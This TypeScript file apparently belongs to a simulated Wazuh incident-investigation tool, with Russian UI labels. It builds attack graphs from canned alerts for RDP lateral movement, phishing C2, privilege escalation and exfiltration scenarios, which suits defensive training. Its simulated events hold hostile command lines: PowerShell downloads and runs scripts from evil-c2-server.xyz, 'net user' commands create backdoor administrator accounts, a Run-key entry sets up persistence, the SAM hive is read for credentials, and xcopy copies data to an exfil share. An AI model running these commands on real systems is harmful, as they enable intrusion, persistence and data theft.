export type NodeType = 'ip' | 'host' | 'user' | 'process' | 'file' | 'domain';
export type EdgeType = 'auth' | 'process' | 'network' | 'file_op' | 'registry' | 'dns';

export interface GraphNode {
  data: {
    id: string;
    label: string;
    type: NodeType;
    color: string;
    shape: string;
    typeLabel: string;
    isInitial?: boolean;
    ip?: string;
    command?: string;
    full_path?: string;
    action?: string;
  };
}

export interface GraphEdge {
  data: {
    id: string;
    source: string;
    target: string;
    type: EdgeType;
    label: string;
    color: string;
    typeLabel: string;
    dash: boolean;
    rule_id?: string;
    severity?: number;
    timestamp?: string;
    full_log?: string;
  };
}

export interface QueryLogEntry {
  step: number;
  name: string;
  description: string;
  params: Record<string, string>;
  results_count: number;
  timestamp: string;
}

export interface GraphResult {
  nodes: GraphNode[];
  edges: GraphEdge[];
  stats: {
    total_nodes: number;
    total_edges: number;
    node_types: Record<string, number>;
    edge_types: Record<string, number>;
  };
  query_log: QueryLogEntry[];
  scenario_info?: {
    id: string;
    name: string;
    description: string;
    techniques: string[];
  };
}

export interface WazuhAlert {
  agent_name: string;
  user_name: string;
  process_name?: string;
  process_cmd?: string;
  src_ip?: string;
  rule_id?: string;
  rule_description?: string;
  severity?: number;
  category?: string;
  full_log?: string;
}

const NODE_STYLES: Record<string, { color: string; shape: string; label: string }> = {
  ip:      { color: '#f97316', shape: 'diamond',         label: 'IP-адрес' },
  host:    { color: '#3b82f6', shape: 'rectangle',       label: 'Хост' },
  user:    { color: '#8b5cf6', shape: 'round-rectangle', label: 'Пользователь' },
  process: { color: '#ef4444', shape: 'hexagon',         label: 'Процесс' },
  file:    { color: '#22c55e', shape: 'triangle',        label: 'Файл' },
  domain:  { color: '#eab308', shape: 'ellipse',         label: 'Домен' },
};

const EDGE_STYLES: Record<string, { color: string; label: string; dash: boolean }> = {
  auth:     { color: '#8b5cf6', label: 'Аутентификация',     dash: true },
  process:  { color: '#ef4444', label: 'Запуск процесса',    dash: false },
  network:  { color: '#3b82f6', label: 'Сетевое соединение', dash: false },
  file_op:  { color: '#22c55e', label: 'Файловая операция',  dash: true },
  registry: { color: '#f97316', label: 'Изменение реестра',  dash: true },
  dns:      { color: '#eab308', label: 'DNS-запрос',         dash: true },
};

const AGENT_IPS: Record<string, string> = {
  'WS-01': '192.168.1.100',
  'WS-02': '192.168.1.150',
  'FS-01': '192.168.1.200',
  'DB-01': '192.168.1.201',
  'DC-01': '192.168.1.10',
  'WEB-01': '192.168.1.50',
};

function timeAgo(minutes: number): string {
  const t = new Date(Date.now() - minutes * 60000);
  return t.toISOString();
}

function getAgentIp(name: string): string {
  return AGENT_IPS[name] || '192.168.1.' + (100 + Math.floor(Math.random() * 150));
}

export interface Scenario {
  id: string;
  name: string;
  description: string;
  complexity: string;
  techniques: string[];
  alert: WazuhAlert;
}

export const SCENARIOS: Scenario[] = [
  {
    id: 'lateral_movement',
    name: 'Латеральное движение через RDP',
    description: 'Злоумышленник получает доступ к рабочей станции через RDP, выполняет разведку, затем перемещается на файловый сервер и сервер БД.',
    complexity: 'Средняя',
    techniques: ['T1021', 'T1059.001', 'T1083', 'T1053', 'T1078', 'T1048'],
    alert: {
      agent_name: 'WS-01', user_name: 'admin', process_name: 'powershell.exe',
      process_cmd: 'powershell -enc <base64_encoded_command>', rule_id: '5716',
      rule_description: 'Suspicious PowerShell execution', severity: 7, category: 'process',
      full_log: 'Suspicious PowerShell with encoded command detected on WS-01 by user admin',
    },
  },
  {
    id: 'phishing_c2',
    name: 'Фишинг и C2-канал',
    description: 'Через фишинговое письмо злоумышленник запускает макрос, который устанавливает C2-соединение с внешним сервером.',
    complexity: 'Высокая',
    techniques: ['T1566.001', 'T1204.002', 'T1059.001', 'T1071.001', 'T1005'],
    alert: {
      agent_name: 'WS-02', user_name: 'ivanov', process_name: 'powershell.exe',
      process_cmd: "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://evil-c2-server.xyz/beacon.ps1')\"",
      src_ip: '192.168.1.150', rule_id: '5716',
      rule_description: 'PowerShell downloading script from external IP', severity: 10, category: 'process',
      full_log: 'PowerShell attempted to download and execute script from external C2 server',
    },
  },
  {
    id: 'privilege_escalation',
    name: 'Повышение привилегий и закрепление',
    description: 'Злоумышленник использует уязвимость для повышения привилегий, создаёт бэкдор-учётную запись и закрепляется через реестр.',
    complexity: 'Средняя',
    techniques: ['T1068', 'T1078', 'T1053', 'T1547.001', 'T1098'],
    alert: {
      agent_name: 'WEB-01', user_name: 'www-data', process_name: 'cmd.exe',
      process_cmd: 'cmd /c net user backdoor P@ssw0rd! /add',
      src_ip: '10.0.0.15', rule_id: '592',
      rule_description: 'New user created from web service', severity: 11, category: 'process',
      full_log: "Web service www-data created new local user 'backdoor' - possible web shell exploitation",
    },
  },
  {
    id: 'data_exfiltration',
    name: 'Эксфильтрация данных',
    description: 'Злоумышленник собирает конфиденциальные данные с нескольких хостов и передаёт их на внешний сервер.',
    complexity: 'Высокая',
    techniques: ['T1083', 'T1005', 'T1048', 'T1041', 'T1071.001'],
    alert: {
      agent_name: 'FS-01', user_name: 'hacker', process_name: 'xcopy.exe',
      process_cmd: 'xcopy C:\\ConfidentialData \\\\192.168.1.105\\exfil /E /H /C /I',
      src_ip: '192.168.1.105', rule_id: '554',
      rule_description: 'Mass file copy to external share', severity: 12, category: 'file',
      full_log: 'Mass file copy detected: C:\\ConfidentialData -> external share on 192.168.1.105',
    },
  },
];

// --- Simulated Wazuh query methods ---

interface SimEvent {
  event_id: string;
  timestamp: string;
  rule_id: string;
  rule_description: string;
  severity: number;
  agent_name: string;
  agent_ip: string;
  src_ip?: string;
  dst_ip?: string;
  src_port?: number;
  dst_port?: number;
  user_name?: string;
  process_name?: string;
  process_cmd?: string;
  file_path?: string;
  file_action?: string;
  category: string;
  full_log: string;
}

let evtCounter = 1000;
function nextId() { return `evt-${++evtCounter}`; }
let portCounter = 49000;
function nextPort() { return portCounter++ % 15000 + 49000; }

function searchAuthEvents(user: string, agent: string): SimEvent[] {
  const srcIp = '192.168.1.105';
  return [
    { event_id: nextId(), timestamp: timeAgo(45), rule_id: '5503', rule_description: 'Successful RDP login',
      severity: 3, agent_name: agent, agent_ip: getAgentIp(agent), src_ip: srcIp, dst_ip: getAgentIp(agent),
      dst_port: 3389, user_name: user, category: 'authentication',
      full_log: `User '${user}' logged in via RDP from ${srcIp}` },
    { event_id: nextId(), timestamp: timeAgo(42), rule_id: '5103', rule_description: 'SMB session opened',
      severity: 3, agent_name: agent, agent_ip: getAgentIp(agent), src_ip: srcIp, dst_ip: getAgentIp(agent),
      dst_port: 445, user_name: user, category: 'authentication',
      full_log: `SMB session for user '${user}' from ${srcIp}` },
  ];
}

function searchNetworkConnections(agent: string): SimEvent[] {
  return [
    { event_id: nextId(), timestamp: timeAgo(30), rule_id: '5102', rule_description: 'Network connection detected',
      severity: 3, agent_name: agent, agent_ip: getAgentIp(agent),
      src_ip: getAgentIp(agent), dst_ip: '192.168.1.200', src_port: nextPort(), dst_port: 445,
      category: 'network', full_log: `Connection from ${getAgentIp(agent)} to 192.168.1.200:445` },
    { event_id: nextId(), timestamp: timeAgo(25), rule_id: '5102', rule_description: 'Network connection detected',
      severity: 3, agent_name: agent, agent_ip: getAgentIp(agent),
      src_ip: getAgentIp(agent), dst_ip: '10.0.0.50', src_port: nextPort(), dst_port: 80,
      category: 'network', full_log: `Connection from ${getAgentIp(agent)} to 10.0.0.50:80` },
    { event_id: nextId(), timestamp: timeAgo(28), rule_id: '5102', rule_description: 'DNS query to suspicious domain',
      severity: 5, agent_name: agent, agent_ip: getAgentIp(agent),
      src_ip: getAgentIp(agent), dst_ip: '8.8.8.8', src_port: nextPort(), dst_port: 53,
      category: 'network', full_log: 'DNS query: evil-c2-server.xyz' },
  ];
}

function searchRelatedAlerts(agent: string): SimEvent[] {
  return [
    { event_id: nextId(), timestamp: timeAgo(20), rule_id: '5716', rule_description: 'Suspicious PowerShell execution',
      severity: 7, agent_name: agent, agent_ip: getAgentIp(agent), user_name: 'admin',
      process_name: 'powershell.exe', process_cmd: 'powershell -enc <base64_encoded_command>',
      category: 'process', full_log: 'PowerShell with encoded command detected' },
    { event_id: nextId(), timestamp: timeAgo(15), rule_id: '554', rule_description: 'Windows registry modification',
      severity: 6, agent_name: agent, agent_ip: getAgentIp(agent), user_name: 'SYSTEM',
      process_name: 'reg.exe',
      process_cmd: 'reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d "C:\\backdoor.exe"',
      file_path: 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', file_action: 'modified',
      category: 'registry', full_log: 'Persistence via Run registry key' },
    { event_id: nextId(), timestamp: timeAgo(12), rule_id: '592', rule_description: 'New user created',
      severity: 8, agent_name: agent, agent_ip: getAgentIp(agent), user_name: 'admin',
      process_name: 'net.exe', process_cmd: 'net user backdoor P@ssw0rd! /add',
      category: 'process', full_log: "New local user 'backdoor' created" },
  ];
}

function searchIpOnOtherHosts(srcIp: string, excludeAgent: string): SimEvent[] {
  return [
    { event_id: nextId(), timestamp: timeAgo(10), rule_id: '5503', rule_description: 'Successful RDP login',
      severity: 3, agent_name: 'FS-01', agent_ip: '192.168.1.200', src_ip: srcIp, dst_ip: '192.168.1.200',
      dst_port: 3389, user_name: 'admin', category: 'authentication',
      full_log: `User 'admin' logged in via RDP from ${srcIp} on FS-01` },
    { event_id: nextId(), timestamp: timeAgo(8), rule_id: '592', rule_description: 'New user created',
      severity: 8, agent_name: 'FS-01', agent_ip: '192.168.1.200', user_name: 'admin',
      process_name: 'net.exe',
      process_cmd: 'net user hacker Qwerty123! /add && net localgroup administrators hacker /add',
      category: 'process', full_log: "New local user 'hacker' added to administrators on FS-01" },
    { event_id: nextId(), timestamp: timeAgo(5), rule_id: '5716', rule_description: 'Suspicious PowerShell execution',
      severity: 7, agent_name: 'DB-01', agent_ip: '192.168.1.201', src_ip: srcIp, user_name: 'admin',
      process_name: 'powershell.exe',
      process_cmd: "powershell -c Invoke-WebRequest -Uri http://evil-c2-server.xyz/payload.ps1 -OutFile C:\\payload.ps1; .\\payload.ps1",
      category: 'process', full_log: 'PowerShell downloading and executing payload from C2 on DB-01' },
    { event_id: nextId(), timestamp: timeAgo(3), rule_id: '554', rule_description: 'Mass file copy detected',
      severity: 9, agent_name: 'FS-01', agent_ip: '192.168.1.200', src_ip: srcIp, user_name: 'hacker',
      process_name: 'xcopy.exe',
      process_cmd: 'xcopy C:\\ConfidentialData \\\\192.168.1.105\\exfil /E /H /C /I',
      file_path: 'C:\\ConfidentialData', file_action: 'read',
      category: 'file', full_log: 'Mass file copy from ConfidentialData to external share' },
  ];
}

function searchProcessEvents(processName: string, agent: string): SimEvent[] {
  if (!processName.toLowerCase().includes('powershell')) return [];
  return [
    { event_id: nextId(), timestamp: timeAgo(18), rule_id: '5716', rule_description: 'PowerShell downloading remote script',
      severity: 8, agent_name: agent, agent_ip: getAgentIp(agent), user_name: 'admin',
      process_name: 'powershell.exe',
      process_cmd: "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.50/recon.ps1')",
      category: 'process', full_log: 'PowerShell downloading and executing remote script' },
    { event_id: nextId(), timestamp: timeAgo(16), rule_id: '5716', rule_description: 'PowerShell credential dumping attempt',
      severity: 12, agent_name: agent, agent_ip: getAgentIp(agent), user_name: 'admin',
      process_name: 'powershell.exe',
      process_cmd: 'powershell -c "Get-ChildItem HKLM:\\SAM | ForEach-Object { ... }"',
      category: 'process', full_log: 'Possible credential dumping via SAM hive access' },
  ];
}

function searchFileEvents(agent: string): SimEvent[] {
  return [
    { event_id: nextId(), timestamp: timeAgo(14), rule_id: '554', rule_description: 'Suspicious file created in system directory',
      severity: 7, agent_name: agent, agent_ip: getAgentIp(agent), user_name: 'admin',
      process_name: 'cmd.exe',
      process_cmd: 'cmd /c echo malicious > C:\\Windows\\Temp\\svchost_evil.dll',
      file_path: 'C:\\Windows\\Temp\\svchost_evil.dll', file_action: 'created',
      category: 'file', full_log: 'Suspicious DLL created in Windows Temp directory' },
  ];
}

// --- Graph Engine ---

export function analyzeAlert(alert: WazuhAlert, scenarioInfo?: { id: string; name: string; description: string; techniques: string[] }): GraphResult {
  evtCounter = 1000;
  portCounter = 49000;
  const nodes: Map<string, GraphNode> = new Map();
  const edges: Map<string, GraphEdge> = new Map();
  const queryLog: QueryLogEntry[] = [];
  let edgeCounter = 0;

  function addNode(id: string, label: string, type: NodeType, extra?: Record<string, string>) {
    if (!nodes.has(id)) {
      const style = NODE_STYLES[type] || { color: '#6b7280', shape: 'ellipse', label: type };
      nodes.set(id, { data: { id, label, type, color: style.color, shape: style.shape, typeLabel: style.label, ...extra } });
    }
  }

  function addEdge(source: string, target: string, type: EdgeType, label: string, extra?: Record<string, unknown>) {
    const id = `e-${source}->${target}-${type}`;
    if (!edges.has(id)) {
      edgeCounter++;
      const style = EDGE_STYLES[type] || { color: '#6b7280', label: type, dash: false };
      edges.set(id, { data: { id, source, target, type, label, color: style.color, typeLabel: style.label, dash: style.dash, ...extra } });
    }
  }

  function logQuery(name: string, description: string, params: Record<string, string>, resultsCount: number) {
    queryLog.push({ step: queryLog.length + 1, name, description, params, results_count: resultsCount, timestamp: new Date().toISOString() });
  }

  function extractFromEvent(evt: SimEvent) {
    if (evt.src_ip) addNode(`ip-${evt.src_ip}`, evt.src_ip, 'ip');
    if (evt.dst_ip) addNode(`ip-${evt.dst_ip}`, evt.dst_ip, 'ip');
    if (evt.agent_name) addNode(`host-${evt.agent_name}`, evt.agent_name, 'host', { ip: evt.agent_ip });
    if (evt.user_name) addNode(`user-${evt.user_name}`, evt.user_name, 'user');
    if (evt.process_name) addNode(`proc-${evt.process_name}`, evt.process_name, 'process', { command: evt.process_cmd });
    if (evt.file_path) {
      const shortName = evt.file_path.includes('\\') ? evt.file_path.split('\\').pop()! : evt.file_path.split('/').pop()!;
      addNode(`file-${evt.file_path}`, shortName, 'file', { full_path: evt.file_path, action: evt.file_action || '' });
    }

    if (evt.category === 'authentication') {
      if (evt.src_ip && evt.agent_name) {
        addEdge(`ip-${evt.src_ip}`, `host-${evt.agent_name}`, 'auth', `${evt.rule_description}\n(${evt.src_ip} -> ${evt.agent_name})`,
          { rule_id: evt.rule_id, severity: evt.severity, timestamp: evt.timestamp, full_log: evt.full_log });
      }
      if (evt.user_name && evt.agent_name) {
        addEdge(`user-${evt.user_name}`, `host-${evt.agent_name}`, 'auth', `Вход: ${evt.user_name} -> ${evt.agent_name}`,
          { rule_id: evt.rule_id, severity: evt.severity, timestamp: evt.timestamp });
      }
    } else if (evt.category === 'network') {
      if (evt.src_ip && evt.dst_ip) {
        addEdge(`ip-${evt.src_ip}`, `ip-${evt.dst_ip}`, 'network',
          `${evt.src_ip}:${evt.src_port} -> ${evt.dst_ip}:${evt.dst_port}`,
          { rule_id: evt.rule_id, severity: evt.severity, timestamp: evt.timestamp, full_log: evt.full_log });
      }
      if (evt.full_log && evt.full_log.includes('DNS')) {
        const match = evt.full_log.match(/(?:query|querying)[\s:]+(\S+)/i);
        if (match) {
          const domain = match[1];
          addNode(`domain-${domain}`, domain, 'domain');
          addEdge(`host-${evt.agent_name}`, `domain-${domain}`, 'dns', `DNS: ${domain}`,
            { rule_id: evt.rule_id, severity: evt.severity, timestamp: evt.timestamp });
        }
      }
    } else if (evt.category === 'process') {
      if (evt.user_name && evt.process_name) {
        addEdge(`user-${evt.user_name}`, `proc-${evt.process_name}`, 'process', `Запуск: ${evt.process_name}`,
          { rule_id: evt.rule_id, severity: evt.severity, timestamp: evt.timestamp, full_log: evt.full_log });
      }
      if (evt.agent_name && evt.process_name) {
        addEdge(`host-${evt.agent_name}`, `proc-${evt.process_name}`, 'process', `На ${evt.agent_name}: ${evt.process_name}`,
          { rule_id: evt.rule_id, severity: evt.severity, timestamp: evt.timestamp });
      }
    } else if (evt.category === 'registry') {
      if (evt.process_name && evt.file_path) {
        addEdge(`proc-${evt.process_name}`, `file-${evt.file_path}`, 'registry', `Реестр: ${evt.file_path}`,
          { rule_id: evt.rule_id, severity: evt.severity, timestamp: evt.timestamp, full_log: evt.full_log });
      }
    } else if (evt.category === 'file') {
      if (evt.process_name && evt.file_path) {
        addEdge(`proc-${evt.process_name}`, `file-${evt.file_path}`, 'file_op', `${evt.file_action}: ${evt.file_path}`,
          { rule_id: evt.rule_id, severity: evt.severity, timestamp: evt.timestamp, full_log: evt.full_log });
      }
      if (evt.user_name && evt.file_path) {
        addEdge(`user-${evt.user_name}`, `file-${evt.file_path}`, 'file_op', `${evt.user_name}: ${evt.file_action} ${evt.file_path}`,
          { rule_id: evt.rule_id, severity: evt.severity, timestamp: evt.timestamp });
      }
    }
  }

  // Step 0: Initial alert
  const initialEvt: SimEvent = {
    event_id: 'initial', timestamp: timeAgo(50), rule_id: alert.rule_id || 'custom',
    rule_description: alert.rule_description || 'Анализируемый алерт', severity: alert.severity || 7,
    agent_name: alert.agent_name, agent_ip: getAgentIp(alert.agent_name), src_ip: alert.src_ip,
    user_name: alert.user_name, process_name: alert.process_name, process_cmd: alert.process_cmd,
    category: alert.category || 'process', full_log: alert.full_log || alert.rule_description || '',
  };
  extractFromEvent(initialEvt);
  logQuery('Исходный алерт', `Анализ алерта: ${alert.rule_description || 'custom'}`,
    { agent: alert.agent_name, user: alert.user_name, process: alert.process_name || '' }, 1);

  // Step 1: Auth
  const authEvts = searchAuthEvents(alert.user_name, alert.agent_name);
  authEvts.forEach(extractFromEvent);
  logQuery('Поиск аутентификации', `Входы пользователя '${alert.user_name}' на ${alert.agent_name} за 60 мин`,
    { user: alert.user_name, agent: alert.agent_name, time_window: '60min' }, authEvts.length);

  const detectedSrcIp = alert.src_ip || (authEvts[0]?.src_ip);

  // Step 2: Network
  const netEvts = searchNetworkConnections(alert.agent_name);
  netEvts.forEach(extractFromEvent);
  logQuery('Сетевые соединения', `Соединения с ${alert.agent_name} за 60 мин`,
    { agent: alert.agent_name, time_window: '60min' }, netEvts.length);

  // Step 3: Related alerts
  const alertEvts = searchRelatedAlerts(alert.agent_name);
  alertEvts.forEach(extractFromEvent);
  logQuery('Связанные алерты', `Другие алерты на ${alert.agent_name} за 60 мин`,
    { agent: alert.agent_name, time_window: '60min' }, alertEvts.length);

  // Step 4: Lateral movement
  if (detectedSrcIp) {
    const lateralEvts = searchIpOnOtherHosts(detectedSrcIp, alert.agent_name);
    lateralEvts.forEach(extractFromEvent);
    logQuery('Латеральное движение', `События с IP ${detectedSrcIp} на других хостах за 60 мин`,
      { src_ip: detectedSrcIp, exclude_agent: alert.agent_name }, lateralEvts.length);
  }

  // Step 5: Process events
  if (alert.process_name) {
    const procEvts = searchProcessEvents(alert.process_name, alert.agent_name);
    procEvts.forEach(extractFromEvent);
    logQuery('Анализ процесса', `События, связанные с ${alert.process_name} на ${alert.agent_name}`,
      { process: alert.process_name, agent: alert.agent_name }, procEvts.length);
  }

  // Step 6: File events
  const fileEvts = searchFileEvents(alert.agent_name);
  fileEvts.forEach(extractFromEvent);
  logQuery('Файловые операции', `Подозрительные файловые операции на ${alert.agent_name}`,
    { agent: alert.agent_name, time_window: '60min' }, fileEvts.length);

  // Mark initial nodes
  if (initialEvt.user_name) {
    const n = nodes.get(`user-${initialEvt.user_name}`);
    if (n) n.data.isInitial = true;
  }
  if (initialEvt.process_name) {
    const n = nodes.get(`proc-${initialEvt.process_name}`);
    if (n) n.data.isInitial = true;
  }
  if (initialEvt.agent_name) {
    const n = nodes.get(`host-${initialEvt.agent_name}`);
    if (n) n.data.isInitial = true;
  }

  const nodeList = Array.from(nodes.values());
  const edgeList = Array.from(edges.values());
  const nodeTypes: Record<string, number> = {};
  const edgeTypes: Record<string, number> = {};
  nodeList.forEach(n => { nodeTypes[n.data.type] = (nodeTypes[n.data.type] || 0) + 1; });
  edgeList.forEach(e => { edgeTypes[e.data.type] = (edgeTypes[e.data.type] || 0) + 1; });

  return {
    nodes: nodeList, edges: edgeList,
    stats: { total_nodes: nodeList.length, total_edges: edgeList.length, node_types: nodeTypes, edge_types: edgeTypes },
    query_log: queryLog, scenario_info: scenarioInfo,
  };
}
